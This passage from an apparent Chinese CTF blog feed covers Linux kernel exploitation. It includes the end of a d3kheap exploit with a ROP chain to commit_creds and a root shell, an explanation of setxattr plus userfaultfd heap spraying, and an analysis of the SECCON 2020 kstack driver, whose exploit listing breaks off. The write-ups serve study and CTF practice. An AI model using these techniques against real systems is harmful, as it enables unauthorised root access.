class="number">0xffffffff81c00ff0</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rop = <span class="number">4</span>;</span><br><span class="line">    pointer_buf[rop++] = pop_rdi;</span><br><span class="line">    pointer_buf[rop++] = init_cred;</span><br><span class="line">    pointer_buf[rop++] = commit_cred;</span><br><span class="line">    pointer_buf[rop++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    pointer_buf[rop++] = <span class="number">0</span>;</span><br><span class="line">    pointer_buf[rop++] = <span class="number">0</span>;</span><br><span class="line">    pointer_buf[rop++] = getShell;</span><br><span class="line">    pointer_buf[rop++] = user_cs;</span><br><span class="line">    pointer_buf[rop++] = user_rflags;</span><br><span class="line">    pointer_buf[rop++] = user_sp;</span><br><span class="line">    pointer_buf[rop++] = user_ss;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;196082&quot;</span>, pointer_buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gadget addr =&gt; %p\n&quot;</span>, pointer_buf[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/iShot_2022-09-16_19.17.09.png"                                     ></p><h2 id="补充一下"><a href="#补充一下" class="headerlink" title="补充一下"></a>补充一下</h2><p>这里解释一下为什么使用<code>swapgs_restore_regs_and_return_to_usermode+0x16</code>首先这里是ROP所以我们需要的是最后swapgs然后iretq，并且这里是开启了KPTI保护的，所以我们在最后还需要修改cr3寄存器。其次为什么要加上0x16呢？首先我们要知道的是前面的pop对我们来说并没有什么用。其次就是在切换完cr3之后我们还有两次pop所以我们需要保证rsp也是在可以识别的，最终根据上述要求我们必须选择<code>swapgs_restore_regs_and_return_to_usermode+0x16</code>。</p><hr><p>参考链接：<a class="link"   href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#0x01-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90" >https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#0x01-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p><p>题目链接：<a class="link"   href="https://github.com/196082/196082/blob/main/kernel_pwn/d3kheap.zip" >https://github.com/196082/196082/blob/main/kernel_pwn/d3kheap.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里作为演示的例题为d3kheap，也是我拖了很久的复现题目，题目链接放在文章末尾。这篇文章使用的方法是作者的预期解的方法，也就是setxattr多次劫持msg_msg泄漏地址，在下一篇文章会记录第二种方法 CVE-2021-22555。&lt;/p&gt;
&lt;h2 id=&quot;题目分析&quot;</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="msg_msg" scheme="https://cv196082.gitee.io/tags/msg-msg/"/>
    
    <category term="pipe_buffer" scheme="https://cv196082.gitee.io/tags/pipe-buffer/"/>
    
    <category term="setxattr" scheme="https://cv196082.gitee.io/tags/setxattr/"/>
    
  </entry>
  
  <entry>
    <title>kernel堆占位</title>
    <link href="https://cv196082.gitee.io/2022/09/06/kernel%E5%A0%86%E5%8D%A0%E4%BD%8D/"/>
    <id>https://cv196082.gitee.io/2022/09/06/kernel%E5%A0%86%E5%8D%A0%E4%BD%8D/</id>
    <published>2022-09-06T11:55:19.000Z</published>
    <updated>2022-09-06T12:06:33.546Z</updated>
    
    <content type="html"><![CDATA[<p>关于userfaultfd这里就不再提及了，不熟悉的可以看一下上一篇文章 <a href="https://cv196082.gitee.io/2022/08/16/userfaultfd/">https://cv196082.gitee.io/2022/08/16/userfaultfd/</a> </p><h2 id="setxattr"><a href="#setxattr" class="headerlink" title="setxattr"></a>setxattr</h2><p>setxattr这个系统调用是非常独特的，在kernel的利用中他可以为我们提供几乎任意大小的object分配。</p><p>setxattr的调用链如下：</p><p><code>SYS_setxattr()</code>=&gt;<code>path_setxattr()</code>=&gt;<code>setxattr()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function">  <span class="title">setxattr</span><span class="params">(struct user_namespace *mnt_userns, struct dentry *d,</span></span></span><br><span class="line"><span class="params"><span class="function">           <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value, <span class="keyword">size_t</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function">           <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> error;</span><br><span class="line">  <span class="keyword">void</span> *kvalue = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">char</span> kname[XATTR_NAME_MAX + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  error = strncpy_from_user(kname, name, <span class="keyword">sizeof</span>(kname));</span><br><span class="line">  <span class="keyword">if</span> (error == <span class="number">0</span> || error == <span class="keyword">sizeof</span>(kname))</span><br><span class="line">    error = -ERANGE;</span><br><span class="line">  <span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size) &#123;</span><br><span class="line">    <span class="keyword">if</span> (size &gt; XATTR_SIZE_MAX)</span><br><span class="line">      <span class="keyword">return</span> -E2BIG;</span><br><span class="line">    kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!kvalue)</span><br><span class="line">      <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line">      error = -EFAULT;</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_ACCESS) == <span class="number">0</span>) ||</span><br><span class="line">        (<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == <span class="number">0</span>))</span><br><span class="line">      posix_acl_fix_xattr_from_user(mnt_userns, d_inode(d),</span><br><span class="line">                                    kvalue, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  error = vfs_setxattr(mnt_userns, d, kname, kvalue, size, flags);</span><br><span class="line">  out:</span><br><span class="line">  kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我发现linux5.19版本里的setxattr函数的代码发生了变化，对于新版本的利用我还了解到比较少这里就不展开说了。可以看到上述代码中可以直接进行kvmalloc之后copy_from_user并且size和value都是我门可控的但是最后会free掉object。</p><h3 id="setxattr-amp-userfaultfd"><a href="#setxattr-amp-userfaultfd" class="headerlink" title="setxattr &amp; userfaultfd"></a>setxattr &amp; userfaultfd</h3><p>虽然我们可控一个object的内容，但是最后始终会free掉导致我们前功尽弃了。但是看过上一篇文章可以注意到在函数中会调用到copy_from_user从用户空间拷贝数据。那么我们可以产生下述想法：</p><p>我们通过 mmap 分配连续的两个页面，在第二个页面上启用 userfaultfd 监视，并在第一个页面的末尾写入我们想要的数据，此时我们调用 setxattr 进行跨页面的拷贝，当 copy_from_user 拷贝到第二个页面时便会触发 userfaultfd，从而让 setxattr 的执行流程卡在此处，这样这个 object 就不会被释放掉，而是可以继续参与我们接下来的利用：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/t016d23a8748e20bf24.png"                      alt="img"                ></p><p>上述就是 setxattr + userfaultfd的堆占位技术</p><h2 id="例题：SECCON-2020-kstack"><a href="#例题：SECCON-2020-kstack" class="headerlink" title="例题：SECCON 2020 kstack"></a>例题：SECCON 2020 kstack</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目开启保护有：smep，KPTI，kaslr</p><p>并且题目给的驱动模块只有一个ioctl函数可供利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v4 = *(_DWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">860</span>);</span><br><span class="line">v8 = kmem_cache_alloc(kmalloc_caches[<span class="number">5</span>], <span class="number">0x6000C0</span>LL); <span class="comment">// size:0x20</span></span><br><span class="line">*(_DWORD *)v8 = v4;</span><br><span class="line">v9 = head;</span><br><span class="line">head = v8;</span><br><span class="line">*(_QWORD *)(v8 + <span class="number">16</span>) = v9;</span><br><span class="line"><span class="keyword">if</span> ( !copy_from_user(v8 + <span class="number">8</span>, v3, <span class="number">8LL</span>) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">head = *(_QWORD *)(v8 + <span class="number">16</span>);</span><br><span class="line">kfree(v8);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-22LL</span>;</span><br></pre></td></tr></table></figure><p>这里分配使用了<code>kmem_cache_alloc(kmalloc_caches[5], 0x6000C0LL);</code>，第二个参数是 flag ，为常规的 <code>GFP_KERNEL</code>这里可以暂且忽略。主要关注的是第一个参数，内核中有一个数组<code>kmalloc_caches</code>存放着<code>kmalloc_cache</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123;</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">96</span>, <span class="number">96</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">192</span>, <span class="number">192</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8</span>, <span class="number">8</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16</span>, <span class="number">16</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32</span>, <span class="number">32</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">64</span>, <span class="number">64</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">128</span>, <span class="number">128</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">256</span>, <span class="number">256</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">512</span>, <span class="number">512</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1024</span>, <span class="number">1</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2048</span>, <span class="number">2</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">4096</span>, <span class="number">4</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8192</span>, <span class="number">8</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16384</span>, <span class="number">16</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32768</span>, <span class="number">32</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">65536</span>, <span class="number">64</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">131072</span>, <span class="number">128</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">262144</span>, <span class="number">256</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">524288</span>, <span class="number">512</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1048576</span>, <span class="number">1</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2097152</span>, <span class="number">2</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">4194304</span>, <span class="number">4</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8388608</span>, <span class="number">8</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16777216</span>, <span class="number">16</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">33554432</span>, <span class="number">32</span>M)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到<code>kmem_caches[5]</code>对应的大小也就是32。然后这里object的前四个字节存放的内容为线程组的id。那么可以推测出结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> id;</span><br><span class="line">  <span class="keyword">char</span> data[<span class="number">8</span>];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">v4 = *(_DWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">860</span>);</span><br><span class="line"><span class="keyword">if</span> ( a2 != <span class="number">0x57AC0001</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0x57AC0002</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v5 = head;</span><br><span class="line">  <span class="keyword">if</span> ( !head )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 == LODWORD(head-&gt;id) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_to_user(a3, &amp;head-&gt;data, <span class="number">8LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5;</span><br><span class="line">      head = (struct node *)v5-&gt;prev;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (struct node *)head-&gt;prev;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( LODWORD(v6-&gt;id) != v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = v6;</span><br><span class="line">        <span class="keyword">if</span> ( !v6-&gt;prev )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        v6 = (struct node *)v6-&gt;prev;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !copy_to_user(a3, &amp;v6-&gt;data, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v5-&gt;prev = v6-&gt;prev;</span><br><span class="line">        LABEL_12:</span><br><span class="line">        kfree(v6);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是上面这个功能，这里首先判断id是否等于当前进程的id如果是则取出数据，若果不是则开始进行循环查找，找到是当前进程id的object再读取数据。在读取出数据之后会进行脱链然后进行free操作。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>可以注意到上述代码中都没有锁的操作，所以这也为userfaultfd提供了可能性。</p><h4 id="leak"><a href="#leak" class="headerlink" title="leak"></a><strong>leak</strong></h4><p>这里只可以读取<code>object+8</code>位置处的数据，这里选择的结构体为： <code>shm_file_data</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里ns位置存放的是kernel的.text段的地址。所以正好是可以泄漏出kernel地址。这里使用的办法就是先创建一个shm结构体随后释放掉，然后我们利用驱动申请一个object，使用userfaultfd阻止我们的数据写入到object中，然后在同一个线程读取出来内容。</p><h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a><strong>attack</strong></h4><p>后续的利用需要使用到double free，这里的double free不知道为什么是可以直接进行的不需要中间隔一个object，所以有清楚的师傅希望可以在评论区告诉我一下。最后就是使用<code>seq_operations</code>和<code>setxattr</code>进行劫持。在最后会用到堆占位的技术，即我们在setxattr中的copy_from_user时，我们只需要将前面0x8个字节的内容复制到<code>seq_operations</code>中，那么后续使用pt_regs进行稳定的拿到root shell。</p><p>对于pt_regs有疑问的可以看一下我前面文章中 <a href="https://cv196082.gitee.io/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/#0CTF-2021-final-kernote">0CTF 2021 final kernote</a> 这道题的做法。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 